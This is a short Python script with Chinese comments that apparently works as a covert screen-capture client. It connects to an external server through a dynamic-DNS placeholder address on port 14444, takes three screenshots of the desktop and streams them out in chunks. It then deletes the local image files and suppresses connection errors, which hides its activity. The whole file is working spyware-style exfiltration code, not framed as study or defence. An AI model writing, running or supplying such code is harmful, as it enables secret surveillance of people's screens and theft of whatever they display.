import socket,pyautogui,time,os,struct
#创建套接字、建立连接
def client_service():
    try:
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #填写外网IP和端口
        serveraddr = ("花生壳IP",14444)
        client.connect(serveraddr)
        #截图并发送至Server
        screenshot(client)
        #清除图片
        for i in range(1, 4):
            os.remove("screenshot_{}.jpg".format(i))

    except socket.error as e:
        pass

#截图并发送
def screenshot(client):
    cout = 0
    #截图三张
    while cout < 3:
    	#使用pyautogui库函数截图
        img = pyautogui.screenshot()
        cout += 1
        img.save("screenshot_{}.jpg".format(cout))
        time.sleep(3)
        
        #分包传输文件，包两端对称
        filepath = "screenshot_{}.jpg".format(cout)
        if os.path.isfile(filepath):
            #判断截图是否存在
            #每个包大小128bytes
            fileinfopck = struct.pack("128sl",bytes(os.path.basename(filepath).encode("utf-8")),os.stat(filepath).st_size)
            client.send(fileinfopck)
            #数据分段发送
            fileobj = open(filepath,"rb")
            while True:
                sendfiledata = fileobj.read(1024)
                if not sendfiledata:
                    print("{}文件发送完毕".format(filepath))
                    break
                client.send(sendfiledata)

if __name__ == "__main__":
    client_service()
 
